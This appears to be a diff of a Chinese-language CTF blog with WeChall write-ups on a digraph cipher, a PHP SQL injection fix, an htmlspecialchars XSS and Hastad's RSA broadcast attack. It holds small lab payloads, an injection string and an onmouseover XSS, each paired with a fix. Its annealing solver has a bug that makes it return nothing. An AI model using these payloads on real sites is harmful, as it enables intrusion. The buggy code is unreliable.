+      <time title="Created: 2026-06-05 21:07:24" itemprop="dateCreated datePublished" datetime="2026-06-05T21:07:24+08:00">2026-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-15 10:12:08" itemprop="dateModified" datetime="2026-09-15T10:12:08+08:00">2026-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-digraphs/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-digraphs/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>Digraph substitution cipher：每个明文字母编码为 2 个字符的
+pair。密文保留原始空格分词，无换行。明文是标准英文，含大小写和标点。</p>
+<p>密文约 290 字符，136 个 digraph pair，30 个唯一 digraph（26 字母 + 4
+标点 <code>!?.:</code>）。映射关系和密码随 session 变化。</p>
+<p>这是同音 cipher：同一字母可能对应多个 digraph（例如 <code>cv</code>
+和 <code>xl</code> 都映射到 <code>c</code>，<code>qn</code> 和
+<code>hc</code> 都映射到
+<code>e</code>）。这意味着纯频率分析无法唯一确定映射，需要结合词结构消歧。</p>
+<h3 id="solution">Solution</h3>
+<p><strong>第一步：识别标点 digraph</strong></p>
+<p>密文保留空格分词，标点出现在词尾。22 个词的固定结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">词 0  &quot;congratulations!&quot;  → 末尾 digraph = &#x27;!&#x27;</span><br><span class="line">词 5  &quot;successfully!&quot;     → 末尾 digraph = &#x27;!&#x27;（应与词 0 相同）</span><br><span class="line">词 10 &quot;either.&quot;           → 末尾 digraph = &#x27;.&#x27;</span><br><span class="line">词 12 &quot;it?&quot;               → 末尾 digraph = &#x27;?&#x27;</span><br><span class="line">词 13 &quot;well.&quot;             → 末尾 digraph = &#x27;.&#x27;（应与词 10 相同）</span><br><span class="line">词 20 &quot;solution:&quot;         → 末尾 digraph = &#x27;:&#x27;</span><br></pre></td></tr></table></figure>
+<p><strong>第二步：用词结构逐步还原字母映射</strong></p>
+<p>词 0 "congratulations!" 是关键锚点：16 个 digraph 对应 16
+个字符，且字母重复模式固定（<code>a</code> 出现 2 次、<code>t</code> 2
+次、<code>o</code> 2 次、<code>n</code> 2 次）。对齐后直接得到 12
+个字母映射。</p>
+<p>然后用短词交叉验证：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">词 19 &quot;as&quot;           → 2 digraph，与词 20 首字母共享</span><br><span class="line">词 20 &quot;solution:&quot;    → 9 digraph，末尾是 &#x27;:&#x27;</span><br><span class="line">词 1  &quot;?ou&quot;          → &quot;you&quot; → 第 1 个 digraph = &#x27;y&#x27;</span><br><span class="line">词 3  &quot;t?is&quot;         → &quot;this&quot; → 第 2 个 digraph = &#x27;h&#x27;</span><br><span class="line">词 6  &quot;?as&quot;          → &quot;was&quot; → 第 1 个 digraph = &#x27;w&#x27;</span><br><span class="line">词 7  &quot;not&quot;          → 直接验证 n/o/t 映射</span><br><span class="line">词 8  &quot;too&quot;          → 验证 &#x27;o&#x27; 的双字母模式</span><br></pre></td></tr></table></figure>
+<p>逐步扩展到全部 30 个 digraph。</p>
+<p><strong>第三步：模拟退火（备选/验证）</strong></p>
+<p>纯频率分析 + 模拟退火也能解，但单独使用收敛较慢（同音 cipher
+导致多个等价映射）。词结构推导出部分映射后，用模拟退火补全剩余未知
+digraph 更实用。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random, math</span><br><span class="line"></span><br><span class="line">eng_freq = &#123;<span class="string">&#x27;e&#x27;</span>:<span class="number">.127</span>,<span class="string">&#x27;t&#x27;</span>:<span class="number">.091</span>,<span class="string">&#x27;a&#x27;</span>:<span class="number">.082</span>,<span class="string">&#x27;o&#x27;</span>:<span class="number">.075</span>,<span class="string">&#x27;i&#x27;</span>:<span class="number">.070</span>,<span class="string">&#x27;n&#x27;</span>:<span class="number">.067</span>,</span><br><span class="line">            <span class="string">&#x27;s&#x27;</span>:<span class="number">.063</span>,<span class="string">&#x27;h&#x27;</span>:<span class="number">.061</span>,<span class="string">&#x27;r&#x27;</span>:<span class="number">.060</span>,<span class="string">&#x27;d&#x27;</span>:<span class="number">.043</span>,<span class="string">&#x27;l&#x27;</span>:<span class="number">.040</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">score_word</span>(<span class="params">word</span>):</span><br><span class="line">    clean = word.rstrip(<span class="string">&#x27;!.,?:&#x27;</span>).lower()</span><br><span class="line">    s = <span class="built_in">sum</span>(eng_freq.get(c, <span class="number">0</span>) * <span class="number">2</span> <span class="keyword">for</span> c <span class="keyword">in</span> clean)</span><br><span class="line">    common = &#123;<span class="string">&#x27;the&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;and&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;was&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;not&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;too&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;you&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;this&#x27;</span>:<span class="number">5</span>,</span><br><span class="line">              <span class="string">&#x27;it&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;as&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;is&#x27;</span>:<span class="number">5</span>,<span class="string">&#x27;congratulations&#x27;</span>:<span class="number">10</span>,<span class="string">&#x27;decrypted&#x27;</span>:<span class="number">10</span>,</span><br><span class="line">              <span class="string">&#x27;successfully&#x27;</span>:<span class="number">10</span>,<span class="string">&#x27;difficult&#x27;</span>:<span class="number">10</span>,<span class="string">&#x27;keyword&#x27;</span>:<span class="number">10</span>,<span class="string">&#x27;solution&#x27;</span>:<span class="number">10</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> s + common.get(clean, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_sa</span>(<span class="params">digraphs, chars, words, n_iter=<span class="number">100000</span>, n_restarts=<span class="number">20</span></span>):</span><br><span class="line">    best_mapping, best_score = <span class="literal">None</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n_restarts):</span><br><span class="line">        m = <span class="built_in">dict</span>(<span class="built_in">zip</span>(digraphs, random.sample(chars, <span class="built_in">len</span>(digraphs))))</span><br><span class="line">        sc = <span class="built_in">sum</span>(score_word(decode(m, w)) <span class="keyword">for</span> w <span class="keyword">in</span> words)</span><br><span class="line">        t = <span class="number">5.0</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n_iter):</span><br><span class="line">            d1, d2 = random.sample(digraphs, <span class="number">2</span>)</span><br><span class="line">            m[d1], m[d2] = m[d2], m[d1]</span><br><span class="line">            ns = <span class="built_in">sum</span>(score_word(decode(m, w)) <span class="keyword">for</span> w <span class="keyword">in</span> words)</span><br><span class="line">            <span class="keyword">if</span> ns &gt; sc <span class="keyword">or</span> random.random() &lt; math.exp((ns - sc) / <span class="built_in">max</span>(t, <span class="number">0.01</span>)):</span><br><span class="line">                sc = ns</span><br><span class="line">                <span class="keyword">if</span> sc &gt; best_score:</span><br><span class="line">                    best_score, best_score = sc, <span class="built_in">dict</span>(m)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                m[d1], m[d2] = m[d2], m[d1]</span><br><span class="line">            t *= <span class="number">0.99995</span></span><br><span class="line">    <span class="keyword">return</span> best_mapping</span><br></pre></td></tr></table></figure>
+<p>实测：20 次重启 × 100k 迭代，约 2
+分钟，不一定收敛到正确明文。词结构推导在极短时间内即可得到结果。</p>
+<p><strong>第四步：提取密码</strong></p>
+<p>明文末尾格式：<code>enter this keyword as solution: [PASSWORD]!</code></p>
+<p>密码在 <code>solution:</code> 后、<code>!</code> 前。提交时去掉末尾
+<code>!</code>（它是明文标点，不是密码的一部分）。</p>
+<p>注意事项： - 同音 cipher：同一字母可能对应多个
+digraph，不能假设一一对应 - 密码随 session
+变化，每次访问页面重新生成</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-php-0815/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-php-0815/" class="post-title-link" itemprop="url">WeChall - PHP 0815</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-06-05 18:26:28" itemprop="dateCreated datePublished" datetime="2026-06-05T18:26:28+08:00">2026-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-15 10:13:03" itemprop="dateModified" datetime="2026-09-15T10:13:03+08:00">2026-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-php-0815/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-php-0815/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>一个有 SQL 注入漏洞的 PHP 脚本，<code>in_array()</code>
+白名单检查可被绕过。要求提供<strong>最短的修复</strong>（least effort
+fix）。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$whitelist</span> = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === (<span class="variable">$show</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>] : <span class="literal">false</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;MISSING PARAMETER; USE foo.bar?show=[1-3]&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$show</span>, <span class="variable">$whitelist</span>))&#123;</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT 1 FROM `table` WHERE `id`=<span class="subst">$show</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Query: &#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$query</span>, ENT_QUOTES).<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SHOWING NUMBER &#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$show</span>, ENT_QUOTES));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;HACKER NONONO&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<p><strong>漏洞分析</strong>: <code>in_array()</code> 默认使用 loose
+comparison（<code>==</code>）。白名单是整数 <code>1, 2, 3</code>，而输入
+<code>"1 union select 1"</code> 通过 <code>==</code>
+比较时会先转为整数：<code>"1 union select 1" == 1</code> → true。因此
+whitelist 检查被绕过，<code>$show</code> 仍然带着完整注入字符串进入 SQL
+查询。</p>
+<p><strong>最短修复</strong>:</p>
+<p>挑战要求「least
+effort」，即在代码的某个逻辑位置增加最少字符来修复漏洞。</p>
+<p>有两种 2 字符的方案：</p>
+<ul>
+<li><code>1*</code>：将 SQL 改为 <code>WHERE \</code>id`=1*<span
+class="math inline">\(show`，在 SQL 层面做乘法运算强制 `\)</span>show`
+转为数字</li>
+<li><code>-0</code>：将 SQL 改为
+<code>WHERE \</code>id`=$show-0`，减法运算同样强制转为数字</li>
+</ul>
+<p>两种都只增加 2 个字符，比 <code>(int)$show</code>（4 字符）或
+<code>in_array($show, $whitelist, true)</code>（6 字符）更短。</p>
+<p>漏洞页面接受 <code>answer</code>
+字段提交，<code>cmd=Fix+It</code>，不需要 CSRF token。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">1*</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-htmlspecialchars/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-htmlspecialchars/" class="post-title-link" itemprop="url">WeChall - htmlspecialchars</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-06-05 18:22:39" itemprop="dateCreated datePublished" datetime="2026-06-05T18:22:39+08:00">2026-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-15 10:13:03" itemprop="dateModified" datetime="2026-09-15T10:13:03+08:00">2026-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-htmlspecialchars/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-htmlspecialchars/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>利用一行有 XSS 漏洞的 PHP 代码。目标是找到漏洞点并提交修复方案。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;http://&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="title class_">Common</span>::<span class="title function_ invoke__">getPost</span>(<span class="string">&#x27;input&#x27;</span>)).<span class="string">&quot;&#x27;&gt;Exploit Me&lt;/a&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<p><strong>漏洞分析</strong>: <code>htmlspecialchars()</code>
+的默认模式是 <code>ENT_COMPAT</code>，只转义双引号 <code>"</code>（转为
+<code>&amp;quot;</code>），不转义单引号 <code>'</code>。而 href
+属性值恰好用单引号包裹，因此可以通过单引号逃逸出属性值，注入 XSS
+事件。</p>
+<p><strong>第一步：漏洞利用</strong>:</p>
+<p>在 input 中输入一个单引号闭合 href，然后注入事件处理属性:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onmouseover=&#x27;alert(1)</span><br></pre></td></tr></table></figure>
+<p>生成的 HTML:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;http://&#x27;</span> <span class="attr">onmouseover</span>=<span class="string">&#x27;alert(1)&#x27;</span>&gt;</span>Exploit Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>注意三个单引号的闭合逻辑： - <code>href='http://</code> 为 HTML
+模板的开头部分 - 第一个 <code>'</code> 闭合了 href 的起始单引号 -
+<code>onmouseover='alert(1)'</code> 被解析为新的 HTML 属性 - 最后的
+<code>'&gt;</code> 会落在属性值的单引号后面（不闭合也不影响渲染）</p>
+<p>悬停在链接上就会触发 <code>onmouseover</code>。在 WeChall
+自己的测试页面里，鼠标悬停就能看到 alert 弹窗。</p>
+<p><strong>第二步：修复</strong>:</p>
+<p>给 <code>htmlspecialchars()</code> 加上 <code>ENT_QUOTES</code>
+标志，使单引号也被转义：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;http://&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="title class_">Common</span>::<span class="title function_ invoke__">getPost</span>(<span class="string">&#x27;input&#x27;</span>), ENT_QUOTES).<span class="string">&quot;&#x27;&gt;Exploit Me&lt;/a&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>加上 <code>ENT_QUOTES</code> 后，输入 <code>'</code> 会被转为
+<code>&amp;#039;</code>，无法再逃逸 href 属性。</p>
+<p><strong>提交方式</strong>: POST 到
+<code>htmlspecialchars.php</code>，字段名为 <code>solution</code>（不是
+<code>answer</code>），<code>cmd=Submit</code>。需要 CSRF token。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">echo
+<a href='http://.htmlspecialchars(Common::getPost(input), ENT_QUOTES).'>Exploit
+Me</a>;</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-php-0818/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-php-0818/" class="post-title-link" itemprop="url">WeChall - PHP 0818</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-06-05 18:19:02" itemprop="dateCreated datePublished" datetime="2026-06-05T18:19:02+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1008,8 +1354,8 @@ MD5 hex 之后</li>
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/WeChall/wechall-save-the-world/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-save-the-world/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-php-0818/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-php-0818/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -1023,37 +1369,25 @@ MD5 hex 之后</li>
     
     
     <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Save the World (Crypto) by Z Hastad broadcast attack — 同一消息
-m，e=3，三个不同 n</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>题面给出一段虚构的世界观故事：三个 RSA
-公钥（<code>e=3</code>，三个不同
-<code>n1,n2,n3</code>）加密了同一个对称密钥 <code>m</code>。目标是恢复
-<code>m</code> 的十进制形式的最后 20 位。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c1 = m^3 mod n1</span><br><span class="line">c2 = m^3 mod n2</span><br><span class="line">c3 = m^3 mod n3</span><br></pre></td></tr></table></figure>
+          <h3 id="challenge">Challenge</h3>
+<p>PHP type juggling 挑战。源码要求输入一个 "magic number"，不能包含数字
+1-9，但必须等于 3735929054。</p>
 <h3 id="solution">Solution</h3>
-<p>这是经典的 Hastad broadcast attack。当同一消息用同一个小指数
-<code>e=3</code>、不同互素 modulus 加密且无 padding 时：</p>
-<p><code>m^3</code> 对三个不同的 n 同余于不同的
-c。用中国剩余定理（CRT）合并，如果 <code>m^3 &lt; n1*n2*n3</code>，则
-CRT 结果直接等于 <code>m^3</code>，开三次方根即可。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> integer_nthroot</span><br><span class="line"></span><br><span class="line">C, mod = crt([n1, n2, n3], [c1, c2, c3])</span><br><span class="line">m, exact = integer_nthroot(<span class="built_in">int</span>(C), <span class="number">3</span>)</span><br><span class="line"><span class="keyword">assert</span> exact</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(m)[-<span class="number">20</span>:])</span><br></pre></td></tr></table></figure>
-<p>完整的从页面抓数→计算的脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, urllib.request</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://www.wechall.net/en/challenge/Z/save_the_world/index.php&#x27;</span></span><br><span class="line">COOKIE = <span class="string">&#x27;WC=...&#x27;</span></span><br><span class="line"></span><br><span class="line">req = urllib.request.Request(URL, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: COOKIE&#125;)</span><br><span class="line">html = urllib.request.urlopen(req, timeout=<span class="number">20</span>).read().decode()</span><br><span class="line">clean = re.sub(<span class="string">r&#x27;&lt;br\s*/?&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, html)  <span class="comment"># 关键：去掉 &lt;br/&gt; 标签</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">pattern</span>):</span><br><span class="line">    m = re.search(pattern, clean)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m.group(<span class="number">1</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">n1 = extract(<span class="string">r&#x27;n1=(\d[\d\s\n]*?)&#x27;</span>)</span><br><span class="line">c1 = extract(<span class="string">r&#x27;c1=(\d[\d\s\n]*?)&#x27;</span>)</span><br><span class="line">n2 = extract(<span class="string">r&#x27;n2=(\d[\d\s\n]*?)&#x27;</span>)</span><br><span class="line">c2 = extract(<span class="string">r&#x27;c2=(\d[\d\s\n]*?)&#x27;</span>)</span><br><span class="line">n3 = extract(<span class="string">r&#x27;n3=(\d[\d\s\n]*?)&#x27;</span>)</span><br><span class="line">c3 = extract(<span class="string">r&#x27;c3=(\d[\d\s\n]*?)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> integer_nthroot</span><br><span class="line"></span><br><span class="line">C, mod = crt([n1, n2, n3], [c1, c2, c3])</span><br><span class="line">m, exact = integer_nthroot(<span class="built_in">int</span>(C), <span class="number">3</span>)</span><br><span class="line"><span class="keyword">assert</span> exact</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(m)[-<span 